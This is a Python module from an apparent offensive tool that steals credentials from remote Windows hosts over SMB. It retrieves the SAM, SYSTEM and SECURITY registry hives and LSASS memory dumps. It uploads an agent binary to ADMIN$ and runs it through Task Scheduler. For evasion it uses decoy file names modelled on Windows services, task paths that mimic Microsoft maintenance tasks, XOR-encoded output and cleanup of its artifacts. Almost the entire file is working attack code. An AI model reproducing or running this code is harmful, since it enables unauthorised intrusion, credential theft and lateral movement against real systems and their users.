"""Agent deployment and data retrieval.

Registry: reads hive files via raw NTFS disk reads (bypasses kernel locks).
First tries RegBack via SMB, then deploys native agent for raw volume access.
Zero registry API calls, zero shadow copies.

LSASS: uploads native agent, executes via Task Scheduler, receives minidump.
"""

import os
import secrets
import string
import struct
import time
import threading
from dataclasses import dataclass, field

from ..smb import SmbSession
from ..rpc.svcctl import SvcCtl
from ..rpc.tsch import TaskScheduler


AGENT_MAGIC_V3 = b'PYD\x03'


def _xor_cipher(data: bytes, key: str) -> bytes:
    kb = key.encode('ascii')
    klen = len(kb)
    out = bytearray(len(data))
    for i, b in enumerate(data):
        out[i] = b ^ kb[i % klen]
    return bytes(out)


def random_name(length: int = 8) -> str:
    return "".join(secrets.choice(string.ascii_lowercase) for _ in range(length))


_AGENT_NAMES = [
    "svcdiag.exe", "telhost.exe", "diagtrack.exe", "wshelper.exe",
    "netprofsvc.exe", "credprov.exe", "tokensvc.exe",
]

_OUTPUT_PREFIXES = [
    "perfdiag_", "winsat_", "cbscore_", "setupact_", "wuaueng_",
    "dfsvc_", "tskmgr_",
]

_TASK_PATHS = [
    "\\Microsoft\\Windows\\Maintenance\\",
    "\\Microsoft\\Windows\\Servicing\\",
    "\\Microsoft\\Windows\\NetTrace\\",
    "\\Microsoft\\Windows\\DeviceSetup\\",
]


@dataclass
class AgentResult:
    """Structured output."""
    system_hive: bytes = b""
    sam_hive: bytes = b""
    security_hive: bytes = b""
    lsass_dump: bytes = b""


class PipeDump:
    """Extract credentials via raw NTFS hive reads and LSASS agent.

    Registry hives are read via raw NTFS disk access (bypasses kernel locks
    and file system filters). LSASS dump uses indirect syscalls.
    """

    def __init__(self, session: SmbSession, agent_path: str):
        self.session = session
        self.agent_path = agent_path
        self._has_agent = os.path.isfile(agent_path) if agent_path else False

    def execute(self, do_registry: bool = True,
                lsass_pid: int = 0) -> AgentResult:
        result = AgentResult()

        need_agent_hives = False
        if do_registry:
            if not self._try_regback(result):
                need_agent_hives = True

        need_agent = need_agent_hives or lsass_pid > 0
        if need_agent:
            if not self._has_agent:
                if lsass_pid > 0:
                    raise RuntimeError(
                        "Agent binary not found (required for LSASS)")
                print("[-] Agent not available for hive file read")
                return result

            mode = 0
            if need_agent_hives:
                mode |= 4
                print("[*] Deploying agent for hive file read...")
            if lsass_pid > 0:
                mode |= 2
            self._run_agent(mode, lsass_pid, result)

        return result

    def find_lsass_pid(self) -> int:
        with self.session.open_pipe("svcctl") as pipe:
            svc = SvcCtl(pipe)
            svc.bind()
            svc.open_sc_manager()
            svc_handle = svc.open_service("SamSs")
            pid = svc.query_service_pid(svc_handle)
            svc.close_handle(svc_handle)
            return pid

    # ── Registry via RegBack (preferred, zero risk) ──────────

    def _try_regback(self, result: AgentResult) -> bool:
        regback = "System32\\config\\RegBack"
        system_data = self._try_read_file(f"{regback}\\SYSTEM")
        if not system_data or len(system_data) < 4096:
            return False

        sam_data = self._try_read_file(f"{regback}\\SAM")
        security_data = self._try_read_file(f"{regback}\\SECURITY")

        if not sam_data or len(sam_data) < 1024:
            return False

        result.system_hive = system_data
        result.sam_hive = sam_data
        result.security_hive = security_data or b""
        print(f"[+] Registry backups (RegBack): "
              f"SYSTEM={len(system_data)} SAM={len(sam_data)} "
              f"SECURITY={len(security_data or b'')} bytes")
        return True

    # ── Agent-based extraction ──────────────────────────────

    def _run_agent(self, mode: int, pid: int,
                   result: AgentResult) -> None:
        """Deploy agent and parse its output.

        mode & 4 = read hive files (NtCreateFile + NtReadFile)
        mode & 2 = LSASS minidump
        """
        output_name = secrets.choice(_OUTPUT_PREFIXES) + random_name(6)
        agent_name = secrets.choice(_AGENT_NAMES)
        task_path = secrets.choice(_TASK_PATHS) + random_name(8)

        self._upload_agent(agent_name)
        cmd = f"C:\\Windows\\Temp\\{agent_name}"
        args = f"{mode} {pid} {output_name}"

        t = threading.Thread(target=self._exec_via_task,
                             args=(task_path, cmd, args), daemon=True)
        t.start()

        try:
            raw = self._read_output_file(output_name, timeout=120)
        finally:
            t.join(timeout=10)
            for name in (agent_name,
                         f"{output_name}.dat", f"{output_name}.tmp"):
                try:
                    self.session.delete_file("ADMIN$", f"Temp\\{name}")
                except Exception:
                    pass

        data = _xor_cipher(raw, output_name)
        if len(data) < 4 or data[:4] != AGENT_MAGIC_V3:
            raise RuntimeError("Invalid agent output (bad magic)")

        offset = 4

        # Registry section: 3 length-prefixed hive blobs
        _NTFS_ERRORS = {
            1: "boot sector read failed",
            2: "not NTFS",
            3: "MFT map build failed",
            4: "MFT entry too large",
            10: "root MFT read failed",
            11: "Windows MFT read failed",
            12: "System32 MFT read failed",
            13: "config MFT read failed",
            20: "root dir: name not found",
            21: "Windows not found",
            22: "System32 not found",
            23: "config not found",
            30: "file MFT read failed",
            31: "file data read zero",
        }
        hive_names = {"system_hive": "SYSTEM",
                      "sam_hive": "SAM",
                      "security_hive": "SECURITY"}
        for attr in ("system_hive", "sam_hive", "security_hive"):
            if offset + 4 > len(data):
                break
            hlen = struct.unpack_from("<I", data, offset)[0]
            offset += 4
            if hlen >= 0xFFFF0000:
                err_code = hlen & 0xFFFF
                desc = _NTFS_ERRORS.get(err_code, f"unknown ({err_code})")
                print(f"    {hive_names[attr]}: NTFS err {err_code} — {desc}")
            elif hlen > 0 and offset + hlen <= len(data):
                setattr(result, attr, data[offset:offset + hlen])
                print(f"    {hive_names[attr]}: {hlen} bytes")
                offset += hlen
            elif mode & 4:
                print(f"    {hive_names[attr]}: open failed")

        # LSASS section
        if mode & 2:
            lsass_data = data[offset:]
            if lsass_data and lsass_data[:4] == b"MDMP":
                result.lsass_dump = lsass_data

    # ── Shared helpers ────────────────────────────────────────

    def _exec_via_task(self, task_path: str, command: str,
                       arguments: str) -> None:
        with self.session.open_pipe("atsvc") as pipe:
            ts = TaskScheduler(pipe)
            ts.bind(self.session.username, self.session.password,
                    self.session.nt_hash)
            ts.register_task(task_path, command, arguments)
            try:
                ts.run_task(task_path)
            except Exception:
                pass
            try:
                ts.delete_task(task_path)
            except Exception:
                pass

    def _upload_agent(self, agent_name: str) -> None:
        from smbprotocol.open import (
            Open, CreateDisposition, CreateOptions,
            FileAttributes, FilePipePrinterAccessMask,
            ImpersonationLevel,
        )

        with open(self.agent_path, "rb") as f:
            agent_data = f.read()

        tree = self.session.tree_connect("ADMIN$")
        fh = Open(tree, f"Temp\\{agent_name}")
        fh.create(
            impersonation_level=ImpersonationLevel.Impersonation,
            desired_access=FilePipePrinterAccessMask.GENERIC_WRITE,
            file_attributes=FileAttributes.FILE_ATTRIBUTE_NORMAL,
            share_access=0,
            create_disposition=CreateDisposition.FILE_OVERWRITE_IF,
            create_options=CreateOptions.FILE_NON_DIRECTORY_FILE,
        )
        offset = 0
        while offset < len(agent_data):
            chunk = agent_data[offset:offset + 65536]
            fh.write(chunk, offset)
            offset += len(chunk)
        fh.close(get_attributes=False)

    def _read_output_file(self, output_name: str,
                          timeout: int = 60) -> bytes:
        dat_path = f"Temp\\{output_name}.dat"
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            try:
                data = self.session.read_file("ADMIN$", dat_path)
                if data:
                    return data
            except Exception:
                pass
            time.sleep(2)
        raise RuntimeError(
            f"Timeout waiting for agent output '{output_name}'")

    def _try_read_file(self, path: str) -> bytes | None:
        try:
            data = self.session.read_file("ADMIN$", path)
            return data if data else None
        except Exception:
            return None
